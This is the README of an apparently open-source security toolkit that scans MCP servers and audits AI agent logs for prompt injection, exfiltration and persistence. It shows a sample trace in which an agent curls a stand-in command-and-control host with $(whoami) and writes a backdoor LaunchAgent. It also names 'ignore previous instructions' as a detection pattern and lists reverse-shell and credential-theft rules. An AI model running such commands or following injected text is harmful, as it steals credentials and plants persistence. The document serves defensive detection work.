<div align="center">

<img src="docs/logo.svg" width="88" height="88" alt="Aspex logo"/>

# Aspex

### AI Agent Security Toolkit

**Scan your MCP servers before you trust them. Audit what your agents actually did.**

[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![CI](https://github.com/aspex-security/aspex/actions/workflows/ci.yml/badge.svg)](https://github.com/aspex-security/aspex/actions/workflows/ci.yml)
[![MCP-scanned by Aspex](https://img.shields.io/badge/MCP--scanned-by%20Aspex-5B44C3)](https://github.com/aspex-security/aspex)

```sh
# macOS / Linux
brew install aspex-security/tap/aspex
```

**Offline. No account. No data leaves your machine. Ever.**

</div>

---

## What is Aspex?

Aspex is an open-source AI agent security toolkit. It ships two CLI tools that cover the two most important questions in any agent-powered workflow.

| Tool | Question it answers |
|---|---|
| `aspex-scan` | Is the MCP server I just installed safe to run? |
| `aspex-trace` | What did my agent actually do while I wasn't looking? |

**aspex-scan** reads every MCP client config on the machine, connects to each server (stdio and HTTP/SSE), enumerates tools, resources, and prompts, and produces a scored risk report. It catches misconfigurations, dangerous capabilities, and credential leaks before an agent ever calls a tool.

**aspex-trace** reads the native log files that Claude Desktop, Claude Code, Cursor, and Windsurf already write to disk. No proxy. No config change. No runtime dependency. It replays what happened, flags anomalous tool calls, and surfaces post-exploitation patterns: credential reads, persistence writes, outbound network calls.

Both tools run fully offline. No account. No data sent anywhere.

## The problem

You wired an MCP server into Claude Desktop or Cursor. You copy-pasted the config from a README, or maybe a blog post. The agent now has access to your filesystem, your GitHub, your browser.

Do you know what that server is actually capable of? Do you know what it did the last time your agent ran?

There is no equivalent of `npm audit` for MCP. No unified view of what your agents did. No security layer between "I installed a server" and "it has shell access to my machine." Aspex is that layer.

---

## aspex-scan

> Scan your MCP setup before you trust it.

aspex-scan reads every MCP client config on the machine, connects to each server (stdio and HTTP/SSE), enumerates tools, resources, and prompts, and produces a scored risk report. Catches misconfigurations, dangerous capabilities, and credential leaks before an agent ever calls a tool.

### What it looks like

```
  ◆  Aspex  v0.1.0

  ╭─────────────────────────────────────────────────────────────╮
  │   12 / 100  ██░░░░░░░░░░░░░░░░░░░░░░  HIGH RISK            │
  │  6 servers · 98 tools · 29 findings · 5s elapsed           │
  │  6 critical  11 high  12 medium                             │
  ╰─────────────────────────────────────────────────────────────╯

  CRITICAL ────────────────────────────────────────────────────

  ◉  playwright              cursor  ·  0 / 100

     CRITICAL  MCP020  Arbitrary code execution
     │ Tool 'browser_run_code_unsafe' executes arbitrary code.
     │ OWASP LLM06 · CWE-94 · CWE-78
     ╰ fix: Remove this tool or sandbox it strictly.

     HIGH      MCP013  Screen capture capability
     │ Tool 'browser_take_screenshot' can capture screen contents.
     │ OWASP LLM02 · CWE-359
     ╰ fix: Remove unless central to the server's stated purpose.

  OK ─────────────────────────────────────────────────────────

  ○  memory  cursor  100 / 100

  ──────────────────────────────────────────────────────────────
  This scanned 1 machine. Fleet-wide coverage: https://onyx.security
```

### What it catches (150+ rules)

| Category | Rules | Examples |
|---|---|---|
| **Prompt injection** | MCP001, MCP002, MCP018, MCP151–MCP156 | Hidden Unicode, "ignore previous instructions", homoglyph tool names, injection phrases in prompt descriptions |
| **Code execution** | MCP003, MCP020, MCP027–MCP034 | `run_command`, `bash`, `eval_code`, container exec, kubectl exec, language REPLs, build system invocations |
| **Credential access** | MCP006, MCP011, MCP014, MCP035–MCP041, MCP093 | API keys in env, `get_env`, browser cookies/keychain, Vault reads, private key/SSH key extraction |
| **Data exfiltration** | MCP042–MCP047 | Email send, Slack/Teams post, webhooks, S3/GCS upload, FTP upload, pastebin creation |
| **Filesystem** | MCP004, MCP008, MCP017 | Arbitrary write, cron/LaunchAgent/rc-file persistence, CI/CD config write |
| **Persistence** | MCP063–MCP068 | Windows registry Run keys, login items, daemon install, systemd units, scheduled tasks |
| **Surveillance** | MCP012, MCP013, MCP048–MCP053 | Clipboard read, screen capture, audio/microphone, camera/video, keystroke logging, location tracking |
| **Recon** | MCP009, MCP024, MCP054–MCP056 | Process spawn, port scan, user/AD enumeration, cloud resource enumeration |
| **Cloud & infrastructure** | MCP057–MCP062, MCP096–MCP100 | IAM role/policy modification, firewall rules, compute provisioning, DNS modification, audit trail disable |
| **Defense evasion** | MCP069–MCP075 | Log clearing, AV/EDR exclusion, shadow copy deletion, timestomping |
| **Privilege escalation** | MCP076–MCP079 | Sudo execution, setuid/capability add, sudoers write, process injection |
| **Network attacks** | MCP082–MCP085, MCP101–MCP107 | Reverse shell, port forwarding, DNS tunnel, Tor proxy, packet capture, ARP spoof, TLS interception |
| **Supply chain** | MCP007, MCP022, MCP032, MCP033 | `@latest`/`@next` tags, package manifest write, package manager installs, build system hooks |
| **Remote server** | MCP010, MCP021 | No auth token, plaintext HTTP transport |
| **Attack surface** | MCP019, MCP025, MCP026 | No input schema, duplicate tool names, >30 tools |
| **Schema-based** | MCP121–MCP125 | Schema accepts `shell_command`, `sudo_password`, `private_key`, AWS secret key |
| **Resource URIs** | MCP130–MCP140 | `/etc/shadow`, SSH keys, `.aws/credentials`, `.env`, private key files, executable MIME types |

All findings map to **OWASP LLM Top 10 2025**, **MITRE ATLAS**, and **CWE**.

### Install

```sh
# macOS / Linux (recommended)
brew install aspex-security/tap/aspex

# Linux / Windows WSL — no Homebrew
curl -fsSL https://raw.githubusercontent.com/aspex-security/aspex/main/install.sh | sh

# Or download a binary directly: https://github.com/aspex-security/aspex/releases
```

### Quickstart

```sh
# Scan every MCP server configured on this machine
aspex-scan

# Static-only scan (no servers launched) — safe to run anywhere
aspex-scan --no-exec

# Scan a single server by command
aspex-scan inspect "npx -y @modelcontextprotocol/server-filesystem ~"

# Scan a remote HTTP/SSE server
aspex-scan inspect https://my-mcp-server.example.com/sse
```

### All flags and commands

```
aspex-scan [flags]
aspex-scan <command>

Commands:
  inspect <target>      Scan a single server by command or URL
  inventory             List every MCP server and tool on this machine
  attack-paths          Identify dangerous cross-server attack chains
  diff --baseline <f>   Compare to a saved baseline (rug-pull detection)
  verify <package>      Check an npm package against the known-bad registry
  install-hook          Install a git pre-commit hook
  uninstall-hook        Remove the pre-commit hook
  completion <shell>    Generate shell completion script (bash|zsh|fish)
  version [--check]     Print version; --check queries GitHub for updates

Flags:
  --no-exec             Static only: parse configs, skip launching servers
  --clients <list>      Comma-separated list of clients to scan:
                        claude, claude-code, cursor, vscode, windsurf,
                        cline, roo-cline, continue, zed (default: all)
  --json                Machine-readable JSON output
  --sarif               SARIF output (for GitHub code scanning)
  --html <file>         Write a self-contained HTML report to a file
  --watch               Re-scan automatically when configs change
  --fail-on <sev>       Exit 1 at or above this severity:
                        critical, high, medium, low (default: off)
  --no-color            Disable colour output
```

### Attack path analysis

The `attack-paths` command does something no per-server scanner can: it identifies dangerous **cross-server** capability combinations that together form a complete attack chain.

```sh
# Does your setup allow file exfiltration?
aspex-scan attack-paths

# JSON output for pipeline processing
aspex-scan attack-paths --json | jq '.chains[] | select(.severity=="critical")'
```

Example output:
```
  ◆  Attack Path Analysis

  CRITICAL  Data Exfiltration  · Exfiltration (TA0010)
     filesystem + fetch combined: attacker can read ~/.*rc, SSH keys, .env
     and POST their contents to an attacker-controlled URL
     servers: filesystem → fetch
     │ filesystem provides: read_file, list_directory
     │ fetch provides: http_request
     │ Combined: attacker reads ~/.aws/credentials and posts to attacker URL

  HIGH  Persistence via Shell  · Persistence (TA0003)
     ...
```

### MCP inventory

```sh
# See exactly what MCP surface area you have
aspex-scan inventory

# JSON for jq / scripting
aspex-scan inventory --json | jq '.servers[] | select(.tool_count > 20)'
```

### Rug-pull detection

Save a baseline when your config is clean, then check for regressions in CI:

```sh
# Save a clean baseline
aspex-scan --json > baseline.json

# Later: exit 1 if any net-new findings appear
aspex-scan diff --baseline baseline.json
```

### Pre-commit hook

Block commits that introduce risky MCP config changes:

```sh
aspex-scan install-hook
```

Adds a hook that runs `--no-exec --fail-on high` on any staged MCP config file.

---

## aspex-trace

> Find out what your agent actually did.

Reads the native log files that Claude Desktop, Claude Code CLI, Cursor, and Windsurf already write to disk. Parses them into a unified, security-annotated audit trail. No proxy. No config change. No runtime dependency.

### What it looks like

```
  ◆  Aspex  v0.1.0

  Clients scanned: claude-code, cursor
  Sessions found:  3  (last 24h)
  Tool calls:      243 across 11 server(s)

  Activity
  12 file write(s)  ·  37 file read(s)  ·  89 shell cmd(s)  ·  4 network call(s)  ·  3 commit(s)
  Top tools:   Bash (89)  ·  Read (37)  ·  Edit (12)  ·  Write (8)  ·  fetch (4)
  Top servers: claude-code (201)  ·  filesystem-mcp (42)
  File access heatmap:
    ████████████  12x  ~/src/app/main.py
    ████████       8x  ~/src/app/config.py
    ██             3x  ~/.aws/credentials

  CRITICAL
  ● [02:17:44]  cursor / filesystem-mcp    run_command
    AT003   Shell command executed
             Tool 'run_command' called with: curl https://c2.evil.example/$(whoami)
    AT002   Outbound network call to external host
             Tool 'run_command' made an outbound request to: https://c2.evil.example/

  CRITICAL
  ● [02:17:46]  cursor / filesystem-mcp    write_file
    AT014   Persistence mechanism write
             Write to persistence location: ~/Library/LaunchAgents/backdoor.plist

  HIGH
  ● [02:17:41]  cursor / filesystem-mcp    read_file
    AT001   Sensitive path accessed
             Tool arg references sensitive path: ~/.aws/credentials

  OK: 237 tool call(s) showed no anomalies.
```

*That session happened at 2:17 AM. The agent read AWS credentials, made an outbound curl to an external host, then wrote a LaunchAgent plist. Textbook post-exploitation sequence. aspex-trace caught it from logs already on disk.*

#### Compact summary mode

Use `--summary` for a quick daily check — stats and finding count only, no per-event breakdown:

```
  ◆  Aspex  v0.1.0

  Session summary  (last 24h, claude-code)
  1061 tool calls  ·  5 server(s)  ·  1 session(s)

  Activity
  89 file write(s)  ·  47 file read(s)  ·  23 shell cmd(s)  ·  8 commit(s)
  Top tools:   Edit (312)  ·  Bash (189)  ·  Read (147)  ·  Write (89)
  Top servers: claude-code (1008)  ·  Claude_Preview (47)  ·  github (6)
  File access heatmap:
    ████████████  41x  ~/src/app/main.py
    █████████     28x  ~/src/app/api.py
    ████           9x  ~/src/app/config.py

  ✓  No anomalies found.
```

### What it catches (85+ rules)

| Category | Rules | Examples |
|---|---|---|
| **Credential file access** | AT001, AT021–AT025 | `.env`, `.ssh/id_rsa`, `.aws/credentials`, kubeconfig, browser password stores, cloud credential files |
| **Code execution** | AT003 | Shell tool invocations from MCP servers |
| **Reverse shell / payload** | AT026–AT030 | Netcat reverse shell, Python reverse shell, curl-pipe-to-shell, base64-encoded commands, eval-of-downloaded-content |
| **Exfiltration** | AT002, AT015, AT017, AT031–AT035 | Outbound URLs, cross-server data chains, database dumps, S3 upload, webhooks, email send, FTP/SFTP |
| **Persistence writes** | AT006, AT014, AT036–AT040 | LaunchAgent/LaunchDaemon plist, Windows registry Run keys, crontab, systemd units, shell init files |
| **Privilege escalation** | AT041–AT043 | Sudo invocation in args, SUID/capability manipulation, sudoers write |
| **Defense evasion** | AT044–AT047 | Log clearing commands, shell history deletion, AV exclusion add, timestomping |
| **Cloud & infrastructure** | AT048–AT050 | IAM modification, firewall rule add, CloudTrail disable |
| **Container** | AT051–AT053 | Container exec, privileged container flags, kubectl apply |
| **Surveillance** | AT019, AT020 | Clipboard read, screen capture |
| **Recon** | AT012, AT018, AT013, AT071–AT073 | Other-user home dir, port scan, mass file enumeration, AD/domain recon, network discovery |
| **Supply chain** | AT009, AT074–AT076 | Package manifest write, package manager install, dependency confusion flags, build hook modification |
| **Obfuscation / staging** | AT060–AT063 | Hex/octal-encoded commands, IFS manipulation, memory dump tools, Windows token stealing |
| **Cryptocurrency** | AT067, AT068 | Crypto transfer initiated, wallet seed phrase in arguments |
| **C2 / malware** | AT081–AT084 | Lateral movement tools (psexec/wmiexec), C2 frameworks (Cobalt Strike, Metasploit), rootkit tools |
| **Sensitive data in args** | AT055, AT056, AT069, AT070 | Private key PEM block, TOTP seed, AWS access key prefix, GitHub token prefix |
| **Anomalous patterns** | AT004, AT005, AT011 | High-volume arguments, off-hours activity, error bursts (stateful, cross-event) |

Stateful rules (AT011 error burst, AT013 mass enumeration, AT015 cross-server chain) track state across the full session, not just individual events.

### Behavioral baseline

Learn what normal looks like for your setup, then flag deviations automatically:

```sh
# Build a baseline from the last 7 days of activity
aspex-trace baseline --learn --since 7d

# Future runs compare against it
aspex-trace --baseline ~/.config/aspex/aspex-trace-baseline.json
```

Deviations flagged: new tools called for the first time, off-hours activity, oversized arguments, new outbound hosts, new file path prefixes.

### Install

Both tools install together — `brew install aspex-security/tap/aspex` installs both `aspex-scan` and `aspex-trace`.

### Quickstart

```sh
# Audit the last 24 hours of agent activity across all supported clients
aspex-trace

# Compact daily summary — stats + finding count only
aspex-trace --summary

# Audit the last 7 days
aspex-trace --since 7d

# Filter to one client or one server
aspex-trace --client cursor
aspex-trace --client claude --server filesystem-mcp

# Suppress low-signal noise for coding-agent sessions
aspex-trace --suppress-noise

# Exit 1 if any critical findings (useful in CI or post-agent hooks)
aspex-trace --fail-on critical
```

### All flags and commands

```
aspex-trace [flags]
aspex-trace <command>

Commands:
  stats                Activity dashboard — no rule evaluation, just counts
  session [id]         Forensic timeline for one session (list or drill in)
  export               Export all events to CSV or JSONL
  live                 Real-time monitoring — tails logs and prints new findings
  baseline --learn     Build a behavioural baseline from recent logs
  completion <shell>   Generate shell completion script (bash|zsh|fish)
  version [--check]    Print version; --check queries GitHub for updates

Flags:
  --client <name>      Filter to one client:
                       claude|claude-code|cursor|windsurf|cline|roo-cline
                       (default: all)
  --server <name>      Filter to one MCP server name
  --since <duration>   How far back to look: 1h, 24h, 7d (default: 24h)
  --summary            Compact stats + finding count only, no per-event detail
  --baseline <file>    Compare against a saved behavioural baseline
  --suppress-noise     Suppress low-signal rules for coding agents (after-hours,
                       high-volume args from file content, etc.)
  --json               Machine-readable JSON output
  --sarif              SARIF output for code scanning
  --fail-on <sev>      Exit 1 at or above this severity (default: high)
  --no-color           Disable colour output
```

### Session forensics

After the main report flags a session, drill into the exact sequence of events:

```sh
# List recent sessions
aspex-trace session

# Forensic timeline for a specific session
aspex-trace session filesystem --since 7d

# JSON for pipeline analysis
aspex-trace session claude-code/2024-01-15/filesystem --json
```

### Export for SIEM / custom analysis

```sh
# Export last 7 days to CSV
aspex-trace export --since 7d --format csv --output audit.csv

# JSONL to stdout, pipe to jq
aspex-trace export --format jsonl | jq 'select(.max_severity=="critical")'
```

### Activity dashboard

```sh
# Quick stats — no rule evaluation, much faster on large log sets
aspex-trace stats

# Last 7 days, Cursor only
aspex-trace stats --since 7d --client cursor
```

### Real-time monitoring

```sh
# Watch all clients, alert on new findings every 5 seconds
aspex-trace live

# Watch only Claude Code, faster poll
aspex-trace live --client claude-code --interval 2
```

---

## Examples

Real-world workflows combining both tools.

### Before installing a new MCP server

```sh
# 1. Static scan first — no code runs
aspex-scan inspect "npx -y @some-org/mcp-server-xyz" --no-exec

# 2. If it looks clean, do a live scan
aspex-scan inspect "npx -y @some-org/mcp-server-xyz"

# 3. Check attack paths after installing it
aspex-scan attack-paths
```

### Daily security audit (automate in cron)

```sh
# Morning check: anything suspicious overnight?
aspex-trace --since 12h --fail-on high

# Weekly scan: have any servers changed?
aspex-scan diff --baseline ~/.config/aspex/baseline.json
```

### After an unexpected agent session

```sh
# See what happened in the last hour
aspex-trace --since 1h

# Drill into a specific suspicious session
aspex-trace session --since 1h  # lists sessions
aspex-trace session filesystem --since 1h  # full timeline
```

### CI gate for agent-enabled repos

```yaml
# .github/workflows/ci.yml — add to any repo using MCP
- name: Audit agent activity
  uses: aspex-security/aspex/.github/actions/aspex-trace-action@v0.2
  with:
    fail-on: critical

- name: Scan MCP configs
  uses: aspex-security/aspex/.github/actions/aspex-scan-action@v0.2
  with:
    fail-on: high
```

### Investigate a compromised machine

```sh
# Full 30-day history — everything that happened
aspex-trace --since 30d --json > audit-30d.json

# Export all events for external forensics tools
aspex-trace export --since 30d --format jsonl | \
  jq 'select(.rule_ids | length > 0)' > flagged-events.jsonl

# What MCP servers did this machine have?
aspex-scan inventory --json > inventory.json

# Could any of them exfiltrate data?
aspex-scan attack-paths --json
```

### Shell completions

```sh
# Set up completions once (example: zsh)
aspex-scan completion zsh > "${fpath[1]}/_aspex-scan"
aspex-trace completion zsh > "${fpath[1]}/_aspex-trace"

# Or for the current session
source <(aspex-scan completion bash)
source <(aspex-trace completion bash)
```

---

## Privacy

Aspex is intentionally simple and intentionally limited.

**What it does not do:**

- Never sends configs, findings, file paths, or tool names anywhere.
- Never proxies or intercepts live traffic.
- Never calls `tools/call` on any MCP server.
- Never reads env variable values from config files (key names only).
- Point-in-time, single-machine by design.

The only network call either tool makes is downloading the binary at install time. After that: fully offline.

Release binaries are signed with [cosign](https://github.com/sigstore/cosign) (keyless, Sigstore). SLSA provenance and SPDX SBOM are published with every release.

```sh
cosign verify-blob \
  --certificate checksums.txt.pem \
  --signature checksums.txt.sig \
  checksums.txt
```

Fleet-wide continuous monitoring, policy enforcement, and attack-path correlation are what [Onyx Security](https://onyx.security) builds. Aspex is the free on-ramp.

---

## Framework coverage

Every finding in both tools maps to at least one of:

| Framework | Coverage |
|---|---|
| [OWASP LLM Top 10 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | LLM01, LLM02, LLM03, LLM06, LLM08 |
| [MITRE ATLAS](https://atlas.mitre.org/) | AML.T0010, AML.T0043, AML.T0048, AML.T0051, AML.T0057 |
| [CWE](https://cwe.mitre.org/) | CWE-20, 22, 77, 78, 89, 94, 116, 200, 214, 272, 284, 306, 307, 312, 319, 359, 522, 526, 732, 829, 918 |

---

## Testing

```sh
go test ./...
```

80 tests across five packages:

| Package | Tests | What they cover |
|---|---|---|
| `internal/rules` | 40 | Every MCP001–MCP026 rule: positive fixture (fires) + negative fixture (does not fire). `TestCleanServer_NoFindings` confirms a benign server produces zero findings. |
| `internal/trace` | 32 | AT001–AT020 rules: each checked with a fixture event that triggers it and one that does not. Stateful rules (AT011 error burst, AT013 mass enumeration, AT015 cross-server chain) tested across multi-event sequences. |
| `internal/logparse` | 4 | Cursor clean log, Cursor anomalous log, Claude Desktop anomalous log, `--since` time filter. Fixtures in `testdata/logs/`. |
| `internal/discover` | 6 | Config parsing for Claude Desktop, Roo-Cline, Continue.dev, and Zed; risky server detection; non-existent file returns nil. Fixtures in `testdata/configs/`. |
| `internal/score` | 4 | Zero findings = 100, single critical = 0, multiple high findings, band labels (OK/LOW/MEDIUM/HIGH/CRITICAL). |

CI runs tests on ubuntu, macos, and windows against Go 1.26.

---

## Contributing

The most impactful contributions are new rules and log format updates as clients evolve.

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add a rule, a trace anomaly, a new client, or a log format update.

**Adding a rule takes about 15 minutes:** write a check function, add it to `EvalServer`, write a positive and negative test, add a doc page.

---

## License

Apache-2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE).

Built and maintained by [Onyx Security](https://onyx.security). Free forever.
